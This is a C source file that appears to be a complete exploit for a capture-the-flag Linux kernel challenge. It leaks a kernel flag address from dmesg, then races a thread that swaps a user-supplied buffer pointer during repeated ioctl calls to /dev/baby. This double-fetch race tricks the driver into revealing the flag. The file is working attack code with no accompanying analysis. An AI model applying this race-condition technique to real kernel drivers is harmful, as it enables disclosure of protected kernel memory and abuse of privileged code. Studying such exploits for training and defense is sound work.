#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <pthread.h>
#include <string.h>
char *strstr(const char *haystack, const char *needle);
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <string.h>

struct inbuf{
    char* buf;
    size_t buf_len;
};
size_t flag_addr;
int finish = 0;
size_t get_addr()
{
    system("dmesg > /tmp/res.txt");
    int fd = open("/tmp/res.txt", O_RDONLY);
    char buf[0x1001] = {0};
    size_t addr;

    puts("To seeek flag");
    lseek(fd, -0x1000, SEEK_END);
    read(fd, buf, 0x1000);
    close(fd);
    char* idx = strstr(buf, "Your flag is at ");
    if (idx == 0)
    {
        puts("Not Found");
        exit(0);
    }
    else{
        idx += 16;
        addr = strtoull(idx, idx+16, 16);
        printf("Found flag_addr:%p\n",addr);
        return addr;
    }
}

//thread func to change indata
void change_data(void *s){
    struct inbuf * buf1 = s;
    while(finish == 0){
        buf1->buf = flag_addr;
    }
}


int main(){
    int fd = open("/dev/baby", 0);
    int ret = ioctl(fd, 0x6666);

    pthread_t t1;
    struct inbuf indata;

    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0); 
    puts("To get flag_addr");
    
    //get flag_addr in kernel
    flag_addr = get_addr();

    //first input data
    char buf[0x100] = {0};
    indata.buf_len = 33;
    indata.buf = buf;
    //seccode doubel fetch
    pthread_create(&t1, NULL, change_data, &indata);
    for(int i = 0; i<1000; i++){
        ret = ioctl(fd, 0x1337, &indata);
        indata.buf = buf;
    }
    finish = 1;
    pthread_join(t1, NULL);
    close(fd);
    puts("result is: ");
    system("dmesg | grep flag");
    return 0;
}
